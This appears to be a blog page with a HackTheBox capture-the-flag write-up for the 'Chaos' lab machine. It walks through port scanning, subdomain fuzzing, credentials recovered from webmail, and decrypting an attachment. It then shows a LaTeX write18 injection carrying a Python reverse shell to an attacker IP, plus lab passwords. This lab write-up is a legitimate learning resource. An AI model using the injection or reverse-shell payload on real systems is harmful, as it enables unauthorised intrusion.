<!DOCTYPE html>
<html>
  <head>
    <title>Pwny_Sec</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2019-07-21T18:19:19 EDT">
<title>CHAOS :: Pwny_Sec</title>
<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
<link href="/css/font-awesome.min.css" rel="stylesheet">
<link href="/css/nucleus.css" rel="stylesheet">
<link href="/theme-flex/style.css" rel="stylesheet">

	<link href="/theme-flex/variant-red.css" rel="stylesheet">

<link rel="stylesheet" href="/css/bootstrap.min.css">
<script src="/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
      var baseurl = "\/";
</script>
<meta name="description" content="">



    
  </head>
  <body data-url="/hackthebox/boxes/chaos-og/">
    
      <header>
  <div class="logo">
    




<h2 id="pwny-sec">Pwny_Sec</h2>




  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://twitter.com/pwny_sec"  rel="noopener">
                  <i class='fa fa-twitter'></i> <label>Twitter</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
                  <i class='fa fa-github'></i> <label>Github repo</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
                  <i class='fa fa-cloud-download'></i> <label>Download</label>
                </a>
            </li>
            <li class="" role="">
                <a href="#"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
                </a>
            </li>
            <li class="" role="">
                <a href="/credits"  rel="noopener">
                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
<li data-nav-id="/concepts/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/dll/" class="dd-item">
    <div>
        <a href="/concepts/dll/">
            DLL-Hijacking
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/file-transfer/" class="dd-item">
    <div>
        <a href="/concepts/file-transfer/">
            File Transfer
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/linux_enum/" class="dd-item">
    <div>
        <a href="/concepts/linux_enum/">
            Linux Enumeration
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/concepts/windows_enum/" class="dd-item">
    <div>
        <a href="/concepts/windows_enum/">
            Windows
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/bypass/" class="dd-item">
    <div>
        <a href="/concepts/bypass/">
            Windows-Bypass
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/">HackTheBox</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/boxes/">Boxes</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/chaos-og/" class="dd-item active">
    <div>
        <a href="/hackthebox/boxes/chaos-og/">
            CHAOS
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/inusectf/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/inusectf/">
            CTF
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier/">
            Carrier
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier-root/">
            CarrierRoot
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/devel/">
            Devel
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/ethereal/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/ethereal/">
            Ethereal
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/flujab/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/flujab/">
            Flujab
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/friendzone/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/friendzone/">
            FriendZone
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/grand-pa/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/grand-pa/">
            GrandMa
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/lightweight/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/lightweight/">
            LightWeight
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/optimum/">
            Optimum
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/sizzle/">
            Sizzle
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/gold-sizzle/">
            Sizzle-Gold
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/vault/">
            Vault
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/teacher/">
            teacher
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
    <div>
        <a href="/hackthebox/github/hugopowershell/">
            Hugo/Github/Power
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
    <div>
        <a href="/hackthebox/challenges/bloodhound/">
            
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>
<li data-nav-id="/help/" class="dd-item
        ">
    <div>

        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/bloodhound/" class="dd-item">
    <div>
        <a href="/tools/bloodhound/">
            BloodHound Neo4j
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/chisel/" class="dd-item">
    <div>
        <a href="/tools/chisel/">
            ChiselTunnel
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ftp/" class="dd-item">
    <div>
        <a href="/tools/ftp/">
            FTP
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/hydra/" class="dd-item
        ">
    <div>

        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/nmap/" class="dd-item">
    <div>
        <a href="/tools/nmap/">
            Nmap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/smb/smb/" class="dd-item">
    <div>
        <a href="/tools/smb/smb/">
            SMB
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/snmpwalk/" class="dd-item
        ">
    <div>

        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/webapp/burp/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
    <div>
        <a href="/tools/webapp/sqlmap/sqlmap/">
            SqlMap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/ssh/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>



    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/concepts/" >
   Concept</option>
    <option value="/hackthebox/" >
   HackTheBox</option> 
    <option value="/hackthebox/boxes/" >
  - 
   Boxes</option> 
    <option value="/hackthebox/boxes/hawk/" >
  -- 
   </option>
    <option value="/hackthebox/boxes/blue/" >
  -- 
   Blue</option>
      <option value="/hackthebox/boxes/chaos-og/"  selected>-- CHAOS</option>
      <option value="/hackthebox/boxes/inusectf/" >-- CTF</option>
      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
    <option value="/hackthebox/boxes/crimestoppers/" >
  -- 
   CrimeStopper</option>
      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
      <option value="/hackthebox/boxes/ethereal/" >-- Ethereal</option>
      <option value="/hackthebox/boxes/flujab/" >-- Flujab</option>
      <option value="/hackthebox/boxes/friendzone/" >-- FriendZone</option>
      <option value="/hackthebox/boxes/grand-pa/" >-- GrandMa</option>
    <option value="/hackthebox/boxes/legacy/" >
  -- 
   Legacy</option>
      <option value="/hackthebox/boxes/lightweight/" >-- LightWeight</option>
    <option value="/hackthebox/boxes/mischief/" >
  -- 
   Mischief</option>
      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
    <option value="/hackthebox/boxes/poison/" >
  -- 
   Poison</option>
    <option value="/hackthebox/boxes/secnotes/" >
  -- 
   SecNotes</option>
      <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
      <option value="/hackthebox/boxes/gold-sizzle/" >-- Sizzle-Gold</option>
    <option value="/hackthebox/boxes/valentine/" >
  -- 
   Valentine</option>
      <option value="/hackthebox/boxes/vault/" >-- Vault</option>
    <option value="/hackthebox/boxes/waldo/" >
  -- 
   Waldo</option>
    <option value="/hackthebox/boxes/zipper/" >
  -- 
   Zipper</option>
    <option value="/hackthebox/boxes/oz/" >
  -- 
   oz</option>
    <option value="/hackthebox/boxes/sunday/" >
  -- 
   sunday</option>
      <option value="/hackthebox/boxes/teacher/" >-- teacher</option>
  
    <option value="/hackthebox/github/" >
  - 
   GitHub</option>
    <option value="/hackthebox/challenges/" >
  - 
   Miscellaneous</option>
  
    <option value="/help/" >
   Network Manager Down</option>
    <option value="/tools/" >
   Tools</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
        <script type="text/javascript" src="/js/lunr.min.js"></script>
        <script type="text/javascript" src="/js/auto-complete.js"></script>
        <link href="/css/auto-complete.css" rel="stylesheet">
        <script type="text/javascript">
          
              var baseurl = "\/";
          
        </script>
        <script type="text/javascript" src="/js/search.js"></script>
      </div>
    

    <h1>CHAOS</h1>
    
    
    
    

<p>chaos web server is hosting quite a few webpages. 10.10.10.120/wp/wordpress, chaos.htb, webmail.chaos.htb, chaos.htb:10000. Using wfuzz we find the subdomain. THERE IS A WAF INPLACE BLOCK ACCESSIVE LOGIN ETC</p>

<p>NMAP</p>

<p>not sure what 10000 really is most likely related</p>

<pre><code>nmap -sC -sV -oA nmap/initial chaos.htb -T4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 09:30 EST                                                                                      Nmap scan report for chaos.htb (10.10.10.120)
Host is up (0.046s latency).         
Not shown: 994 closed ports          
PORT      STATE SERVICE  VERSION       
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)      
|_http-title: Chaos                            
110/tcp   open  pop3     Dovecot pop3d                                                                                                              
|_pop3-capabilities: STLS TOP UIDL AUTH-RESP-CODE RESP-CODES PIPELINING SASL CAPA
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos  
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49           
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap     Dovecot imapd (Ubuntu)                                                                                                     
|_imap-capabilities: ID more LITERAL+ STARTTLS OK listed post-login Pre-login IMAP4rev1 capabilities LOGIN-REFERRALS IDLE ENABLE have LOGINDISABLEDA0
001 SASL-IR                          
| ssl-cert: Subject: commonName=chaos  
| Subject Alternative Name: DNS:chaos  
| Not valid before: 2018-10-28T10:01:49           
|_Not valid after:  2028-10-25T10:01:49               
|_ssl-date: TLS randomness does not represent time                      
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)    
|_imap-capabilities: ID AUTH=PLAINA0001 more OK listed post-login Pre-login IMAP4rev1 LITERAL+ LOGIN-REFERRALS IDLE capabilities have ENABLE SASL-IR
| ssl-cert: Subject: commonName=chaos                                                                                                               
| Subject Alternative Name: DNS:chaos                       
| Not valid before: 2018-10-28T10:01:49 
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) TOP UIDL AUTH-RESP-CODE RESP-CODES PIPELINING CAPA USER
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>

<pre><code>nmap -p- -oA nmap/total-chaos chaos.htb -T4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 09:41 EST
Nmap scan report for chaos.htb (10.10.10.120)
Host is up (0.055s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE
80/tcp    open  http
110/tcp   open  pop3
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
10000/tcp open  snet-sensor-mgmt
</code></pre>

<pre><code>nmap -sU -T4 udp-chaos chaos.htb 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 11:22 EST
Failed to resolve &quot;udp-chaos&quot;.
Warning: 10.10.10.120 giving up on port because retransmission cap hit (6).
Nmap scan report for chaos.htb (10.10.10.120)
Host is up (0.040s latency).
Not shown: 964 closed ports, 35 open|filtered ports
PORT      STATE SERVICE
10000/udp open  ndmp
</code></pre>

<h2 id="gobuster">GOBUSTER</h2>

<p>enumerated all the known webpages</p>

<p><a href="http://10.10.10.120">http://10.10.10.120</a></p>

<pre><code>/wp (Status: 301)
	/wordpress
		/index.php (Status: 301)
		/wp-content (Status: 301)
		/wp-login.php (Status: 200)
		/wp-includes (Status: 301)
		/wp-trackback.php (Status: 200)
		/wp-admin (Status: 301)
		/wp-signup.php (Status: 302)
/javascript (Status: 301)

</code></pre>

<p><a href="http://chaos.htb">http://chaos.htb</a></p>

<pre><code>/index.html (Status: 200)
/contact.html (Status: 200)
/about.html (Status: 200)
/blog.html (Status: 200)
/img (Status: 301)
/css (Status: 301)
/source (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/hof.html (Status: 200)
</code></pre>

<p><a href="https://chaos.htb:10000">https://chaos.htb:10000</a>     NOTHING</p>

<h3 id="wfuzz-subdomains">WFUZZ - subdomains</h3>

<p>Fails</p>

<pre><code>wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u &quot;http://FUZZ.chaos.htb:10000&quot; -t 42
-f filename,printer       : Store results in the output file using the specified printer (raw printer if omitted).
-H &quot;Host: FUZZ.10.10.10.120&quot;
</code></pre>

<pre><code>wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Dis
covery/DNS/subdomains-top1mil-5000.txt -u &quot;http://10.10.10.120&quot; -H &quot;Host: FUZZ.10.10.10.120&quot;
-t 42 --hc 400
i also fuzzed /wp/wordpress
</code></pre>

<pre><code>wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u &quot;http://FUZZ.chaos.htb:10000&quot; -t 42                     
</code></pre>

<p>Mild success</p>

<pre><code>wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Di$
covery/DNS/subdomains-top1mil-5000.txt -u &quot;http://chaos.htb/wp/wordpress&quot; -H &quot;Host: FUZZ.cha$
s.htb&quot; -t 42 --hc 400       

000003:  C=301      9 L       28 W          333 Ch        &quot;localhost&quot;
000004:  C=403     11 L       32 W          304 Ch        &quot;webmail&quot;
000005:  C=301      9 L       28 W          323 Ch        &quot;smtp&quot;
</code></pre>

<p>Sucess</p>

<pre><code>wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u &quot;http://chaos.htb&quot; -H &quot;Host: FUZZ.chaos.htb&quot; -t 42 --hl 1   

000004:  C=200    120 L      386 W         5607 Ch        &quot;webmail&quot;
</code></pre>

<p><img src="https://chickenpwny.github.io/images/chaos/wfuzzmeow.PNG" alt="wfuzz2" /></p>

<p>WEBAPP&rsquo;S</p>

<p>1)<img src="https://chickenpwny.github.io/images/chaos/wp-10.10.10.120-0.PNG" alt="wp-10.10.10.120-0" /></p>

<p>2)chaos.htb</p>

<p><img src="https://chickenpwny.github.io/images/chaos/webpage-hof.PNG" alt="webpage-hof" /></p>

<p>3)10.10.10.120/wp/wordpress     #we found this using gobuster initially</p>

<p>here we will find the credentials for webmail(roundcube)        # password : human</p>

<p><img src="https://chickenpwny.github.io/images/chaos/wp-10.10.10.120.PNG" alt="wp-10.10.10.120" /></p>

<p><img src="https://chickenpwny.github.io/images/chaos/wp-10.10.10.120-5.PNG" alt="wp-10.10.10.120-5" /></p>

<p>4) webmail.chaos.htb    # enter the above creds into the login protal</p>

<p>​   #Then navigate to drafts and download the attachments</p>

<p><img src="https://chickenpwny.github.io/images/chaos/webmail.PNG" alt="webmail" /></p>

<p><img src="https://chickenpwny.github.io/images/chaos/webmail2.PNG" alt="webmail2" /></p>

<p>HYDRA   # THERE IS A WAF INPLACE that&rsquo;s why we see direct ip not allowed and our brute forcing attempts are blocked.</p>

<p>DECRYPTING  <a href="https://github.com/argosk/encrypt-Python">https://github.com/argosk/encrypt-Python</a>    #  To decrypt this file i used a python script i found on github it will ask you for to either encrpt for decrypt a file then select a file. eneter the key to de or en crypt the file. in the email we are told the password is our name. we are addressed as sahay.</p>

<p><img src="https://chickenpwny.github.io/images/chaos/decrypt-file.PNG" alt="decrypt-file" /></p>

<pre><code>#python script.py password file
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = &quot;en&quot; + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
</code></pre>

<h2 id="j00-w1ll-f1nd-n07h1n9-h3r3">J00_w1ll_f1Nd_n07H1n9_H3r3</h2>

<p>Finally we&rsquo;re we need to be for the joooooice! we find out selve on a little web app that makes pdf&rsquo;s for some kind of firm that puts the header to make official on the pdf. The input isn&rsquo;t properly sanatized we can use. this app uses latex to structure and build the documents submited into the desired format. we are interested in the ability to run commands/</p>

<p>after some expierentation i found what i need to get rce.</p>

<p>1)</p>

<p><img src="https://chickenpwny.github.io/images/chaos/final-webpage.PNG" alt="final-webpage" /></p>

<p>2) playing around with burp<img src="https://chickenpwny.github.io/images/chaos/final-webpage-black-list.PNG" alt="final-webpage-black-list" /></p>

<p>3) when it is base64 encoded is bypass bypass restrictions. webapp can read base64 soemthing that b missed<img src="https://chickenpwny.github.io/images/chaos/final-webpage-black-list-b64.PNG" alt="final-webpage-black-list-b64" /></p>

<p>4)After some time found what i needed to get rce.</p>

<pre><code>\immediate\write18{CMD GOES HERE}
</code></pre>

<p>5) We can script it in to encode it b64<img src="https://chickenpwny.github.io/images/chaos/final-webpage3.PNG" alt="final-webpage3" /></p>

<p>6)i used python to get a rshell. 0xdf used rm/nc</p>

<h3 id="python-reverse-shell-success">python reverse shell &ndash; success</h3>

<pre><code>content=\immediate\write18{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.15.159&quot;,9080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &gt; chickenp.sh|base64 &gt; chickenp.sh}

\newread\file

\openin\file=chickenp.sh

\loop\unless\ifeof\file

\read\file to\fileline

\text{\fileline}

\repeat

\closein\file

Run1

&amp;template=test3
</code></pre>

<p><img src="https://chickenpwny.github.io/images/chaos/shell.PNG" alt="shell" /></p>

<p><img src="https://chickenpwny.github.io/images/chaos/shells-success.PNG" alt="shells-success" /></p>

<p>USER &amp; ROOT</p>

<p>First thing&rsquo;s first figure out who am i. www-data use su to switch to ayush use the same password. then using the tarwild card technique we will get root.</p>

<p>LinEnum</p>

<pre><code>[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.10
DISTRIB_CODENAME=cosmic
DISTRIB_DESCRIPTION=&quot;Ubuntu 18.10&quot;
NAME=&quot;Ubuntu&quot;
VERSION=&quot;18.10 (Cosmic Cuttlefish)&quot;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&quot;Ubuntu 18.10&quot;
VERSION_ID=&quot;18.10&quot;
HOME_URL=&quot;https://www.ubuntu.com/&quot;
SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;
BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;
PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;
VERSION_CODENAME=cosmic
UBUNTU_CODENAME=cosmic

</code></pre>

<p>Su ayush</p>

<p>username – ayush</p>

<p>password – jiujitsu</p>

<p>EXPORT</p>

